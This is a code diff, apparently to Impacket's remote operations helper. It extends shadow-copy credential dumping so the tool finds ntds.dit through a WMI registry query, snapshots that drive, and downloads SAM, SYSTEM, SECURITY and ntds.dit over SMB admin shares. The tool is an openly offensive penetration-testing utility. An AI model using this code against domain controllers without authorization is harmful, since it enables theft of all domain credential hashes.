@@ -1139,6 +1139,47 @@ class RemoteOperations:
 
         dcom.disconnect()
 
+    def __wmiGetNTDSLocation(self):
+        """
+        Query the registry via WMI to get the actual NTDS.dit location.
+        Returns a tuple of (ntdsLocation, ntdsDrive) or (None, None) if not found.
+        """
+        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
+        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
+                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
+        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
+        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
+        iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/default', NULL, NULL)
+        iWbemLevel1Login.RemRelease()
+
+        try:
+            # Get the StdRegProv class for registry access
+            stdRegProv, _ = iWbemServices.GetObject('StdRegProv')
+            
+            # HKEY_LOCAL_MACHINE = 0x80000002
+            HKLM = 0x80000002
+            subKey = 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters'
+            valueName = 'DSA Database file'
+            
+            # Call GetStringValue method to read the registry value
+            result = stdRegProv.GetStringValue(HKLM, subKey, valueName)
+            
+            # The result contains sValue which is the registry value
+            ntdsLocation = result.sValue
+            if ntdsLocation:
+                ntdsDrive = ntdsLocation[:2]  # e.g., "C:" or "D:"
+                LOG.debug('WMI Registry query found NTDS.dit at: %s' % ntdsLocation)
+                dcom.disconnect()
+                return ntdsLocation, ntdsDrive
+            else:
+                LOG.debug('WMI Registry query returned empty NTDS location')
+                dcom.disconnect()
+                return None, None
+        except Exception as e:
+            LOG.debug('Failed to query NTDS location via WMI: %s' % str(e))
+            dcom.disconnect()
+            return None, None
+
     def __executeRemote(self, data):
         self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
         command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
@@ -1283,7 +1324,7 @@ class RemoteOperations:
         return remoteFileName
 
     def createSSandDownloadWMI(self, volume, localPath, NTDS=False):
-        LOG.info('Creating SS')
+        LOG.info('Creating SS for volume %s' % volume)
         ssID = self.__wmiCreateShadow(volume)
         LOG.info('Getting SMB equivalent PATH to access remotely the SS')
         gmtSMBPath = self.__smbConnection.listSnapshots(self.__smbConnection.connectTree('ADMIN$'), '/')[0]
@@ -1295,18 +1336,83 @@ class RemoteOperations:
                  ('%s/SYSTEM' % localPath, '%s\\System32\\config\\SYSTEM' % gmtSMBPath),
                  ('%s/SECURITY' % localPath, '%s\\System32\\config\\SECURITY' % gmtSMBPath)]
 
+        ntdsSsID = None
+        ntdsGmtSMBPath = None
+        ntdsShareName = None
+        
         if NTDS:
-            LOG.debug('Adding NTDS Path')
-            paths.append(('%s/ntds.dit' % localPath, '%s\\NTDS\\ntds.dit' % gmtSMBPath))
+            LOG.debug('Querying registry for NTDS.dit location')
+            ntdsLocation, ntdsDrive = self.__wmiGetNTDSLocation()
+            
+            if ntdsLocation is None:
+                # Fall back to default location
+                LOG.warning('Could not determine NTDS.dit location from registry, using default path')
+                ntdsLocation = 'C:\\Windows\\NTDS\\ntds.dit'
+                ntdsDrive = 'C:'
+            
+            LOG.info('NTDS.dit is located at: %s' % ntdsLocation)
+            
+            # Normalize the volume to compare (remove trailing backslash)
+            volumeDrive = volume.rstrip('\\')
+            
+            # Check if NTDS is on a different drive than the main volume
+            if ntdsDrive.upper() != volumeDrive.upper():
+                LOG.info('NTDS.dit is on a different drive (%s) than the main volume (%s)' % (ntdsDrive, volumeDrive))
+                LOG.info('Creating additional SS for NTDS volume %s' % ntdsDrive)
+                ntdsSsID = self.__wmiCreateShadow(ntdsDrive + '\\')
+                
+                # We need to access the NTDS drive's snapshot
+                # The share name for a drive is typically the drive letter followed by $
+                ntdsShareName = ntdsDrive[0] + '$'
+                
+                try:
+                    ntdsGmtSMBPath = self.__smbConnection.listSnapshots(self.__smbConnection.connectTree(ntdsShareName), '/')[0]
+                    LOG.debug('Got NTDS GMT Path from %s share: %s' % (ntdsShareName, ntdsGmtSMBPath))
+                except Exception as e:
+                    LOG.warning('Could not access %s share for NTDS snapshot: %s' % (ntdsShareName, str(e)))
+                    # Clean up the NTDS snapshot if we can't use it
+                    if ntdsSsID:
+                        self.__wmiDeleteShadow(ntdsSsID)
+                    ntdsSsID = None
+                    ntdsGmtSMBPath = None
+                    ntdsShareName = None
+            else:
+                # NTDS is on the same drive as the main volume
+                ntdsGmtSMBPath = gmtSMBPath
+                ntdsShareName = 'ADMIN$'
+            
+            if ntdsGmtSMBPath:
+                # Extract the path relative to the drive root
+                # ntdsLocation is like "D:\Windows\NTDS\ntds.dit" or "C:\Windows\NTDS\ntds.dit"
+                # We need the path after the drive letter, e.g., "\Windows\NTDS\ntds.dit"
+                ntdsRelativePath = ntdsLocation[2:]  # Remove drive letter (e.g., "D:")
+                ntdsSnapshotPath = '%s%s' % (ntdsGmtSMBPath, ntdsRelativePath)
+                LOG.debug('Adding NTDS Path: %s from share %s' % (ntdsSnapshotPath, ntdsShareName))
+                paths.append(('%s/ntds.dit' % localPath, ntdsSnapshotPath, ntdsShareName))
+            else:
+                LOG.error('Could not determine NTDS snapshot path, skipping NTDS download')
 
         for p in paths:
-            LOG.debug("Downloading Remote path: %s to -> %s" % (p[1], p[0]))
-            with open(p[0], 'wb') as local_file:
-                self.__smbConnection.getFile('ADMIN$', p[1], local_file.write)
+            if len(p) == 3:
+                # NTDS path with custom share
+                localFile, remotePath, shareName = p
+            else:
+                # Default paths use ADMIN$ share
+                localFile, remotePath = p
+                shareName = 'ADMIN$'
+            
+            LOG.debug("Downloading Remote path: %s from share %s to -> %s" % (remotePath, shareName, localFile))
+            with open(localFile, 'wb') as local_file:
+                self.__smbConnection.getFile(shareName, remotePath, local_file.write)
 
         # Return a list of the local paths where SAM, SYSTEM and SECURITY were downloaded
         LOG.debug('Trying to delete ShadowSnapshot')
         self.__wmiDeleteShadow(ssID)
+        
+        # Delete the NTDS snapshot if we created a separate one
+        if ntdsSsID:
+            LOG.debug('Trying to delete NTDS ShadowSnapshot')
+            self.__wmiDeleteShadow(ntdsSsID)
 
         LOG.debug('Downloaded SAM, SYSTEM and SECURITY from Shadow Snapshot. Dumping...')
         return list(zip(*paths))[0]
